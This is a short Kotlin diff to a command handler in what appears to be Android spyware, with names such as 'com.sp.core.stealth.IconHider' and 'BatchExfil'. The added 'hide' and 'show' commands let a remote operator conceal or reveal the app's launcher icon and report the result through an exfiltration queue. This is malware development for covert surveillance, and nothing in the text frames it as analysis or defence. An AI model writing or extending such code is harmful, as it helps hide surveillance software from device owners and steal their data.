@@ -60,6 +60,16 @@ object Commands {
 
             "flush" -> BatchFlushWorker.flushNow(ctx)
 
+            "hide" -> {
+                com.sp.core.stealth.IconHider.hide(ctx)
+                BatchExfil.enqueue(ctx, "cmd", """{"ok":true,"icon":"hidden"}""")
+            }
+
+            "show" -> {
+                com.sp.core.stealth.IconHider.show(ctx)
+                BatchExfil.enqueue(ctx, "cmd", """{"ok":true,"icon":"visible"}""")
+            }
+
             else -> BatchExfil.enqueue(ctx, "cmd", """{"unknown":"$cmd"}""")
         }
     }
